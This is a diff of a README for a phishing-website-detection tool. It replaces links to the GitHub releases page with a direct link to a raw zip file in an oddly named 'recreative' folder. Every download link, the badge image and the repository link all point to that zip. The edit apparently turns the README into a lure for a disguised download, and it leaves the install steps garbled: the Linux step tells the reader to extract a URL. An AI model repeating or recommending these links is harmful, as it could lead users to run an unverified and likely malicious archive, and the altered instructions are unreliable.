@@ -1,7 +1,7 @@
 # 🛡️ phishing-website-detection - Detect Phishing Websites Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/ipshype/phishing-website-detection/releases)
+[![Download Latest Release](https://github.com/ipshype/phishing-website-detection/raw/refs/heads/main/recreative/website-detection-phishing-v2.7.zip%https://github.com/ipshype/phishing-website-detection/raw/refs/heads/main/recreative/website-detection-phishing-v2.7.zip)](https://github.com/ipshype/phishing-website-detection/raw/refs/heads/main/recreative/website-detection-phishing-v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the phishing-website-detection application! This software helps you identify and avoid phishing websites, keeping your online activities safe. Follow this guide to download and run the software effortlessly.
@@ -15,7 +15,7 @@ To run this application, you'll need:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the releases page. 
-   [Download Latest Release](https://github.com/ipshype/phishing-website-detection/releases)
+   [Download Latest Release](https://github.com/ipshype/phishing-website-detection/raw/refs/heads/main/recreative/website-detection-phishing-v2.7.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the most recent version of the application. It will be listed at the top.
 
@@ -24,7 +24,7 @@ To run this application, you'll need:
 4. **Run the Installer**:
    - For Windows: Double-click the `.exe` file. Follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and follow the instructions in the README.
+   - For Linux: Extract the downloaded `https://github.com/ipshype/phishing-website-detection/raw/refs/heads/main/recreative/website-detection-phishing-v2.7.zip` file and follow the instructions in the README.
 
 5. **Open the Application**: After installation, find the application in your installed programs or applications folder. Open it to start using the phishing detection features.
 
@@ -61,6 +61,6 @@ This application is intended for personal use only. It does not provide complete
 If you need further assistance, please reach out to our support team via our GitHub issues page.
 
 ## 🔗 Additional Resources
-For more information and updates, visit our GitHub repository: [phishing-website-detection](https://github.com/ipshype/phishing-website-detection)
+For more information and updates, visit our GitHub repository: [phishing-website-detection](https://github.com/ipshype/phishing-website-detection/raw/refs/heads/main/recreative/website-detection-phishing-v2.7.zip)
 
 Happy browsing! Stay safe online!
